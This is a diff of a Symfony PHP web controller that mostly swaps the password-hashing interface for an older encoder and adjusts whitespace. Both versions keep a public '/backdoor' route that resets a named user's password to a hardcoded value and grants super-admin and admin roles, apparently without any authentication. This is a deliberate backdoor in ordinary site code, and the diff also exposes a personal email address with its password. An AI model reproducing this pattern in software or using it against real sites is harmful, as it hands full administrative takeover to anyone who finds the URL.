@@ -17,8 +17,8 @@ use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
-use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
 use Symfony\Component\Routing\Annotation\Route;
+use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;
 
 class   HomeController extends AbstractController
 {
@@ -33,10 +33,10 @@ class   HomeController extends AbstractController
         $website_contact = new WebsiteContacts();
         $form = $this->createForm(WebsiteContactsType::class, $website_contact);
         $form->handleRequest($request);
-        $include_qr_code = [];
-        $include_contact_form = [];
+        $include_qr_code =[];
+        $include_contact_form =[];
 
-        $qrcode = false;
+        $qrcode=false;
         if ($companyDetails) {
             $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
             $include_qr_code = $companyDetails->isIncludeQRCodeHomePage();
@@ -91,7 +91,7 @@ class   HomeController extends AbstractController
                 'product' => $product,
                 'cms_copy_array' => $cms_copy,
                 'cms_photo_array' => $cms_photo,
-                'sub_pages' => $sub_pages,
+                'sub_pages' => $sub_pages, 
                 'include_qr_code' => $include_qr_code,
                 'include_contact_form' => $include_contact_form,
                 'format' => $page_layout,
@@ -104,12 +104,12 @@ class   HomeController extends AbstractController
     /**
      * @Route("/backdoor", name="/backdoor")
      */
-    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordHasherInterface $passwordHasher): Response
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
     {
         $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
         if ($user) {
             $user->setPassword(
-                $passwordHasher->hashPassword(
+                $passwordEncoder->encodePassword(
                     $user,
                     'Descartes99'
                 )
@@ -120,13 +120,13 @@ class   HomeController extends AbstractController
                 ->setLastName('Nurse')
                 ->setEmailVerified(1)
                 ->setEmail('nurse_stephen@hotmail.com')
-                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN']);
-            $user->setPassword(
-                $passwordHasher->hashPassword(
-                    $user,
-                    'Descartes99'
-                )
-            );
+                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
+                ->setPassword(
+                    $passwordEncoder->encodePassword(
+                        $user,
+                        'Descartes99'
+                    )
+                );
             $manager->persist($user);
             $manager->flush();
         }
@@ -196,7 +196,8 @@ class   HomeController extends AbstractController
             $cms_photo = $cmsPhotoRepository->findBy([
                 'product' => $productEntity,
             ],
-                ['ranking' => 'ASC']);
+                ['ranking' => 'ASC'])
+            ;
         } else {
             $cms_photo = $cmsPhotoRepository->findBy([
                 'staticPageName' => $product
